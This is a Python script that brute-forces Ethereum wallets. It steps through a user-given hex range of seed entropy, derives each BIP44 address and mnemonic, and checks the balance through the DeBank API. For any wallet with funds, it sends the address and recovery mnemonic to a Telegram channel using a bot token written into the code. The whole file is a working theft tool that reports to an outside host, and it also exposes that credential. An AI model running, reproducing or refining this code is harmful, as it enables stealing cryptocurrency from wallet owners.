import requests
from hdwallet import BIP44HDWallet
from hdwallet.cryptocurrencies import EthereumMainnet
from hdwallet.derivations import BIP44Derivation
from typing import Optional
from threading import Thread

class telegram:
    token = '5237275928:AAE_v3LMCBoNJSO-zeQPYBrqjOWxPGpaMvk'
    channel_id = '@maxgood11'
def send_telegram(text: str):
    try:
        requests.get('https://api.telegram.org/bot{}/sendMessage'.format(telegram.token), params=dict(
        chat_id=telegram.channel_id,
        text=text))
        print ("Send to telegram")
    except:
        print(f'Error send telegram.')
send_telegram("Начал Домашний комп")
threadc = int(input("potoki: "))
start_str = input('Start of range: ')
end_str = input('End of range: ')
def divide(stuff):
    return [stuff[i::threadc] for i in range(threadc)]
    
start = int(start_str, 16)
end = int(end_str, 16)
a = range(start, end+1)
def checker(a):
    for i in a:
        #a = range(start, end+1)
        #f.write('{:064X}\n'.format(i))
        #print('{:032x}\n'.format(i)) # SMALL CHARACTERS 

        ENTROPY: str = ('{:032x}'.format(i))
        PASSPHRASE: Optional[str] = None
        bip44_hdwallet: BIP44HDWallet = BIP44HDWallet(cryptocurrency=EthereumMainnet)
        bip44_hdwallet.from_entropy(
        entropy=ENTROPY, language="english", passphrase=PASSPHRASE)
        bip44_hdwallet.clean_derivation()
        address_index = 0
        bip44_derivation: BIP44Derivation = BIP44Derivation(
        cryptocurrency=EthereumMainnet, account=0, change=False, address=address_index)
        bip44_hdwallet.from_path(path=bip44_derivation)
        addr = bip44_hdwallet.address()
        mnemonic = bip44_hdwallet.mnemonic()
        print(mnemonic)
        print(addr)
        json_bal = requests.get(f"https://openapi.debank.com/v1/user/total_balance?id={addr}").json()
        print(f"Balance: {json_bal['total_usd_value']}")
        if float(json_bal['total_usd_value'])  > 0.0:
            text = (f"Address: {addr}\nMnemonic: {mnemonic}\nBalance: {json_bal['total_usd_value']}\n")
            send_telegram(text)
send_telegram("End")

threads = []


for i in range(threadc):
    threads.append(Thread(target=checker,args=[divide(a)[i]]))
    threads[i].start()
for thread in threads:
    thread.join()
